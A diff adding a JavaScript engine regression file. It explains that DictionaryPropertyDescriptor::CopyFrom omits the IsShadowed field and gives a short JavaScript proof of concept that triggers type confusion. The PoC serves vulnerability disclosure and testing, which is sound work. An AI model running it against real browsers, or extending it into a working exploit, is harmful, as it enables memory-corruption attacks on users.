@@ -1,0 +1,38 @@
+/*
+Here's the method.
+    template <typename TPropertyIndex>
+    template <typename TPropertyIndexFrom>
+    void DictionaryPropertyDescriptor<TPropertyIndex>::CopyFrom(DictionaryPropertyDescriptor<TPropertyIndexFrom>& descriptor)
+    {
+        this->Attributes = descriptor.Attributes;
+        this->Data = (descriptor.Data == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Data;
+        this->Getter = (descriptor.Getter == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Getter;
+        this->Setter = (descriptor.Setter == DictionaryPropertyDescriptor<TPropertyIndexFrom>::NoSlots) ? NoSlots : descriptor.Setter;
+        this->IsAccessor = descriptor.IsAccessor;
+
+#if ENABLE_FIXED_FIELDS
+        this->IsInitialized = descriptor.IsInitialized;
+        this->IsFixed = descriptor.IsFixed;
+        this->UsedAsFixed = descriptor.UsedAsFixed;
+#endif
+    }
+
+Given its name, I think that the method is supposed to copy all the fields from another descriptor to "this". But it actually leaves some fields uncopied. The "IsShadowed" field is one of them which indicates that a Let or Const variable has been declared in the global object with the same name as the name of a property of the global object. This lack of copying the "IsShadowed" field can lead to type confusion like in the PoC or uninitialized pointer dereference.
+
+PoC:
+*/
+
+let x = 1;
+
+this.x = 0x1234;  // IsShadowed
+
+// Convert to BigDictionaryTypeHandler, CopyFrom will be used in the process.
+for (let i = 0; i < 0x10000; i++) {
+    this['a' + i] = 1;
+}
+
+// Set IsAccessor
+this.__defineSetter__('x', () => {});
+
+// Type confusion
+this.x;
